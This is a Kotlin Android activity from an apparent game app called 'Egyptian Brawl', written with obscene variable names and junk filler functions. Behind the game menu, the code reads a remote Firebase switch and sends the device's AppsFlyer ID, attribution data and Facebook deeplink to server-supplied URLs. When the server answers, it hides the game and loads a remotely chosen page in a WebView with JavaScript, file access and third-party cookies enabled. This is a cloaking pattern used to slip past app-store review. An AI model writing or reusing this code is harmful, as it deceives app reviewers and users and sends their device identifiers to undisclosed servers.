package com.brawlegypt.edyptianbrawl

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.brawlegypt.edyptianbrawl.databinding.LoadingwindowBinding
import com.brawlegypt.edyptianbrawl.fragmentsgame.gameEgipt
import com.brawlegypt.edyptianbrawl.fragmentsgame.gamemenu
import com.brawlegypt.edyptianbrawl.initservices.keynumSurvices
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.json.JSONObject
import java.util.*
import kotlin.collections.HashMap


lateinit var ifuckyourass: LoadingwindowBinding
var keeeeeyOnMyDick: String? = null
var facebooks: String? = null

class LoadingsWindow : AppCompatActivity() {
    lateinit var lol: Map<String, Any>
    var kek: String? = null
    var urlKEKES: String? = null
    var linkKEKES2: String? = null
    var BooleanComPornoHab: Boolean = false
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ifuckyourass = LoadingwindowBinding.inflate(layoutInflater)
        setContentView(ifuckyourass.root)
        supportFragmentManager
            .beginTransaction()
            .replace(ifuckyourass.viewPagerContainer.id, gamemenu())
            .commit()
        val loading = AnimationUtils.loadAnimation(this, R.anim.loadintextwindow)
        ifuckyourass.texLoading.startAnimation(loading)
        loading.setAnimationListener(object : Animation.AnimationListener{
            override fun onAnimationStart(verh: Animation?) {
            }

            override fun onAnimationEnd(vniz: Animation?) {
                firebaseXYITA()
            }

            override fun onAnimationRepeat(vniz1: Animation?) {
            }
        })
        val phoneID = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        keeeeeyOnMyDick = phoneID
        ErrorAOE()
        popka()
    }

    private fun initXYITAAPPS() {
        AppsFlyerLib.getInstance().setDebugLog(true)
        val RequestMyDick: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(xyib: Map<String, Any>) {
                try {
                    lol = xyib
                    openShitWebView()
                } catch (loll: Exception) {
                    loll.printStackTrace()
                }
            }
            override fun onConversionDataFail(lolkek: String) {
                runOnUiThread {
                    popka1()
                    ifuckyourass.texLoading.visibility = View.GONE
                    ifuckyourass.barView.visibility = View.GONE
                    ifuckyourass.constrainContainer.visibility = View.VISIBLE
egyptload()
                }
            }

            override fun onAppOpenAttribution(atrr: Map<String, String>) {
                runOnUiThread {
                    ifuckyourass.texLoading.visibility = View.GONE
                    ifuckyourass.barView.visibility = View.GONE
                    ifuckyourass.constrainContainer.visibility = View.VISIBLE
                    egyptload()
                    popka3()
                }
            }

            override fun onAttributionFailure(atrrE: String) {
                runOnUiThread {
                    popka()
                    ifuckyourass.texLoading.visibility = View.GONE
                    ifuckyourass.barView.visibility = View.GONE
                    ifuckyourass.constrainContainer.visibility = View.VISIBLE
                    egyptload()
                }
            }
        }
        AppsFlyerLib.getInstance().init(keynumSurvices.isMyLoka, RequestMyDick, this)
        AppsFlyerLib.getInstance().registerConversionListener(this, RequestMyDick)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun firebaseXYITA() {
        FirebaseDatabase.getInstance().getReference("egiptsettings").child("booleanWebView").addValueEventListener(object :
            ValueEventListener {
            override fun onDataChange(xyita: DataSnapshot) {
                if (xyita.exists()) {
                    val XyitaWebView = xyita.getValue(Boolean::class.java)
                    if (XyitaWebView == true){
                        FirebaseDatabase.getInstance().getReference("egiptsettings").child("facebookTitle").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(xyita: DataSnapshot) {
                                if (xyita.exists()) {
                                    val ebanieSilki = xyita.getValue(Long::class.java)
                                    facebooks = ebanieSilki.toString()
                                    popka3()
                                }
                            }

                            override fun onCancelled(xyita: DatabaseError) {
                                egyptload()
                            }
                        })

                        FirebaseDatabase.getInstance().getReference("egiptsettings").child("redLinks1").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(xyita: DataSnapshot) {
                                if (xyita.exists()) {
                                    urlKEKES = xyita.getValue(String::class.java)
                                    popka()
                                }
                            }

                            override fun onCancelled(xyita: DatabaseError) {
                            }
                        })

                        FirebaseDatabase.getInstance().getReference("egiptsettings").child("redLinks2").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(xyita: DataSnapshot) {
                                if (xyita.exists()) {
                                    linkKEKES2 = xyita.getValue(String::class.java)
                                    xyitaShagomMarsh()
                                    popka3()

                                }
                            }

                            override fun onCancelled(xyita: DatabaseError) {
                            }
                        })

                    }else{
                        ifuckyourass.constrainContainer.visibility = View.VISIBLE
                        popka()
                        ifuckyourass.texLoading.visibility = View.GONE
                        ifuckyourass.barView.visibility = View.GONE
                        Toast.makeText(this@LoadingsWindow, "Failed connect", Toast.LENGTH_SHORT).show()
                         }
                }
            }

            override fun onCancelled(xyita: DatabaseError) {
                egyptload()
            }
        })
    }
    private fun xyitaShagomMarsh() {
        facHaxyi()
        openHaxyiAO(keeeeeyOnMyDick!!)
        initXYITAAPPS()
        egyptload()
        popka1()
    }

    private fun openShitWebView() {
        popka2()
        val egipt = Volley.newRequestQueue(this)
        val egiptJS1 = JSONObject()
        egiptJS1.put("appsFlyerId", keeeeeyOnMyDick)
        val egiptJS2 = JSONObject(lol)
        egiptJS1.put("apsInfo", egiptJS2)
        egiptJS1.put("deeplink", if(kek == null) JSONObject.NULL else kek)

        var egiptJSLink = urlKEKES
        val popkiLink = object: JsonObjectRequest(
            Request.Method.POST, egiptJSLink, egiptJS1,
            { response ->
                if(response.getBoolean("success")) {
                    BooleanComPornoHab = true
                    ifuckyourass.WebViewMain.settings.javaScriptEnabled = true
                    ifuckyourass.WebViewMain.settings.domStorageEnabled = true
                    ifuckyourass.WebViewMain.settings.allowFileAccessFromFileURLs = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(ifuckyourass.WebViewMain, true)
                    val apFlGetId: String = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
                    ifuckyourass.WebViewMain.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(lalka: WebView?, lalkaUrl: String?, LalkaStore: Bitmap?) {
                            super.onPageStarted(lalka, lalkaUrl, LalkaStore)

                        }

                        override fun onPageFinished(VWeb: WebView, LalraUrl: String) {
                            ifuckyourass.WebViewMain.visibility = View.VISIBLE
                            ifuckyourass.texLoading.visibility = View.GONE
                            ifuckyourass.barView.visibility = View.GONE
                            ifuckyourass.constrainContainer.visibility = View.GONE
                            LoadAPF(LalraUrl)
                            popka()
                        }

                        override fun onReceivedHttpError(
                            cokaCola: WebView?,
                            Sprite: WebResourceRequest?,
                            Fanta: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(cokaCola, Sprite, Fanta)
                            ErrorAOE(apFlGetId)
                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(pop: WebView?, resourse: WebResourceRequest?, lolka: WebResourceError?) {
                            super.onReceivedError(pop, resourse, lolka)
                            ErrorAOE(apFlGetId)
                            popka3()
                        }
                    }
                    ifuckyourass.WebViewMain.loadUrl(response.getString("url"))


                }
                else{
                    ifuckyourass.texLoading.visibility = View.GONE
                    ifuckyourass.barView.visibility = View.GONE
                    ifuckyourass.constrainContainer.visibility = View.VISIBLE


                }
            }, { error ->
                ifuckyourass.texLoading.visibility = View.GONE
                ifuckyourass.barView.visibility = View.GONE
                ifuckyourass.constrainContainer.visibility = View.VISIBLE

            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val pinas: MutableMap<String, String> = HashMap()
                pinas["Device-UUID"] = keeeeeyOnMyDick!!
                return pinas
            }
        }
        egipt.add(popkiLink)
    }

    private fun ErrorAOE(ErrorAOEMain: String) {
        val ErrorAOE1 = Volley.newRequestQueue(this)
        val ErrorAOE2 = JSONObject()
        ErrorAOE2.put("name", "a_e_w")
        val ErrorAOE3 = JSONObject()
        ErrorAOE3.put("success", true)
        ErrorAOE3.put("url", urlKEKES)
        ErrorAOE3.put("error", ErrorAOEMain)
        popka1()
        popka2()
        ErrorAOE2.put("data", ErrorAOE3)
        ErrorAOE2.put("created", continentTimer())
        var ErrorAOELink = linkKEKES2

        val ErrorAOEJS = object: JsonObjectRequest(
            Request.Method.POST, ErrorAOELink, ErrorAOE2,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val ErrorAOE: MutableMap<String, String> = java.util.HashMap()
                ErrorAOE["Device-UUID"] = keeeeeyOnMyDick!!
                return ErrorAOE
            }

        }
        ErrorAOE1.add(ErrorAOEJS)
    }
    fun egipetBrawlsStars(){
        egipetBrawlsStarsTop()
    }

    private fun egipetBrawlsStarsTop() {
        supportFragmentManager
            .beginTransaction()
            .replace(ifuckyourass.viewPagerContainer.id, gameEgipt())
            .commit()
    }
    private fun LoadAPF(linkUr: String) {
        popka3()
        val LoadAPF1 = Volley.newRequestQueue(this)
        val LoadAPF2 = JSONObject()
        LoadAPF2.put("name", "a_p_f")
        val LoadAPF3 = JSONObject()
        LoadAPF3.put("success", true)
        LoadAPF3.put("url", linkUr)
        LoadAPF2.put("data", LoadAPF3)
        LoadAPF2.put("created", continentTimer())
        var LoadAPFLink = linkKEKES2

        val LoadAPFJsones = object: JsonObjectRequest(
            Request.Method.POST, LoadAPFLink, LoadAPF2,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val LoadAPF: MutableMap<String, String> = java.util.HashMap()
                LoadAPF["Device-UUID"] = keeeeeyOnMyDick!!
                return LoadAPF
            }
        }
        LoadAPF1.add(LoadAPFJsones)
    }

    private fun continentTimer(): Long {
        val LoadContinent: Date = Calendar.getInstance().time
        return LoadContinent.time
    }


    private fun openHaxyiAO(LinksMURLs: String) {
        popka1()
        val openHaxyiAO1 = Volley.newRequestQueue(this)
        val openHaxyiAOBody = JSONObject()
        openHaxyiAOBody.put("name", "a_o")
        val openHaxyiAOBody1 = JSONObject()
        openHaxyiAOBody1.put("success", true)
        openHaxyiAOBody.put("data", openHaxyiAOBody1)
        openHaxyiAOBody.put("created", continentTimer())
        var openHaxyiAOLinkUrl = linkKEKES2
        val openHaxyiAOJsones = object: JsonObjectRequest(
            Request.Method.POST, openHaxyiAOLinkUrl, openHaxyiAOBody,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val openHaxyiAO: MutableMap<String, String> = HashMap()
                openHaxyiAO["Device-UUID"] = LinksMURLs
                return openHaxyiAO
            }
        }
        openHaxyiAO1.add(openHaxyiAOJsones)
    }


    private fun ErrorAOE() {
        popka()
        val ErrorAOEvolley = Volley.newRequestQueue(this)
        val ErrorAOEObject = JSONObject()
        ErrorAOEObject.put("name", "a_o_e")
        val ErrorAOE1 = JSONObject()
        ErrorAOE1.put("success", true)
        ErrorAOEObject.put("data", ErrorAOE1)
        ErrorAOEObject.put("created", continentTimer())
        var ErrorAOELinkas = linkKEKES2

        val ErrorAOEJsones = object: JsonObjectRequest(
            Request.Method.POST, ErrorAOELinkas, ErrorAOEObject,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val ErrorAOE: MutableMap<String, String> = HashMap()
                ErrorAOE["Device-UUID"] = keeeeeyOnMyDick!!
                return ErrorAOE
            }
        }
        ErrorAOEvolley.add(ErrorAOEJsones)
    }
    override fun onKeyDown(klychi: Int, keyEvents: KeyEvent?): Boolean {
        if ((klychi == KeyEvent.KEYCODE_BACK) && ifuckyourass.WebViewMain.canGoBack()) {
            ifuckyourass.WebViewMain.goBack()
            return true
        }

        return super.onKeyDown(klychi, keyEvents)
    }
    override fun onBackPressed() {
        if ( ifuckyourass.WebViewMain.isFocused() &&  ifuckyourass.WebViewMain.canGoBack()) {
            ifuckyourass.WebViewMain.goBack()
        } else {
        }
    }
    private fun facHaxyi() {

        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setApplicationId(facebooks)
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            if(it==null){
                kek = it.toString()
            } else {
                kek = it.getTargetUri().toString()
            }
        }
    }
fun popka(){
    var pipiska = "vfknsjdjkvzkdnjv"
    var pipka = "vsfddsffknsjdjkvzkdnjv"
    var pipiskal = pipiska.length
    var pipkal = pipka.length
    var koka = pipiskal + pipkal / 2
    if (koka >=4){
        println(koka)

    }
    else{
        Toast.makeText(this, "No, koka lose", Toast.LENGTH_SHORT).show()
    }
}
    fun popka1(){
        var pipiska = "vfknsjdjkvzkdnjv"
        var pipka = "vsfddsffknsjdjkvzkdnjv"
        var pipiskal = pipiska.length
        var pipkal = pipka.length
        var koka = pipiskal + pipkal / 2
        if (koka >=4){
            println(koka)

        }
        else{
            Toast.makeText(this, "No, koka lose", Toast.LENGTH_SHORT).show()
        }
    }
    fun popka2(){
        var pipiska = "vfknsjdjkvzkdnjv"
        var pipka = "vsfddsffknsjdjkvzkdnjv"
        var pipiskal = pipiska.length
        var pipkal = pipka.length
        var koka = pipiskal + pipkal / 2
        if (koka >=4){
            println(koka)

        }
        else{
            Toast.makeText(this, "No, koka lose", Toast.LENGTH_SHORT).show()
        }
    }
    fun popka3(){
        var pipiska = "vfknsjdjkvzkdnjv"
        var pipka = "vsfddsffknsjdjkvzkdnjv"
        var pipiskal = pipiska.length
        var pipkal = pipka.length
        var koka = pipiskal + pipkal / 2
        if (koka >=4){
            println(koka)

        }
        else{
            Toast.makeText(this, "No, koka lose", Toast.LENGTH_SHORT).show()
        }
    }
}